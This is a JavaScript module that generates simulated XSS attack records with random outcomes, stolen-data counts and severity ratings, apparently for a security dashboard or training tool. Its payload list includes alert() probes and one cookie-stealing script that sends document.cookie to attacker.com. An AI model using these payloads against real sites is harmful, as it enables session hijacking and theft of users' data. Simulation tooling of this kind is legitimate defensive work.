const { generateRandomIP } = require('../utils/generators');

/**
 * XSS payload types and examples
 */
const XSS_PAYLOADS = [
  { payload: '<script>alert("XSS")</script>', type: 'Reflected' },
  { payload: '<img src=x onerror="alert(\'XSS\')">', type: 'DOM-based' },
  { payload: '<svg/onload=alert("XSS")>', type: 'Stored' },
  { payload: '"><script>fetch("http://attacker.com/?c="+document.cookie)</script>', type: 'Reflected' },
  { payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>', type: 'DOM-based' },
];

/**
 * Generates random exposed data from XSS attack
 * @returns {Object} Exposed data object
 */
function generateExposedData() {
  return {
    cookiesStolen: Math.floor(Math.random() * 100) + 10,
    sessionTokensStolen: Math.floor(Math.random() * 50) + 5,
    usersAffected: Math.floor(Math.random() * 200) + 20,
  };
}

/**
 * Calculates severity based on success and exposed data
 * @param {boolean} success - Whether the XSS attack was successful
 * @param {Object} exposedData - Data that was exposed
 * @returns {string} Severity level
 */
function calculateSeverity(success, exposedData) {
  if (!success) return 'Low';

  const totalExposed = exposedData.cookiesStolen + exposedData.sessionTokensStolen + exposedData.usersAffected;

  if (totalExposed <= 100) return 'Medium';
  if (totalExposed <= 300) return 'High';
  return 'Critical';
}

/**
 * Simulates a Cross-Site Scripting (XSS) attack
 * @returns {Object} XSS attack object with all simulation data
 */
function simulateXSSAttack() {
  // Determine if attack is successful (40% success, 60% failure)
  const success = Math.random() < 0.4;

  // Select random payload
  const payloadObj = XSS_PAYLOADS[Math.floor(Math.random() * XSS_PAYLOADS.length)];

  // Generate exposed data only if successful
  const exposedData = success ? generateExposedData() : null;

  // Determine attack complexity
  const attackComplexities = ['Low', 'Medium', 'High'];
  const attackComplexity = attackComplexities[Math.floor(Math.random() * attackComplexities.length)];

  // Calculate severity
  const severity = calculateSeverity(success, exposedData);

  return {
    sourceIP: generateRandomIP(),
    targetURL: ['/', '/dashboard', '/profile', '/search', '/admin'][Math.floor(Math.random() * 5)],
    payload: payloadObj.payload,
    xssType: payloadObj.type,
    attackComplexity: attackComplexity,
    success: success,
    dataExposed: exposedData,
    severity: severity,
    timestamp: new Date().toISOString(),
  };
}

module.exports = {
  simulateXSSAttack,
};
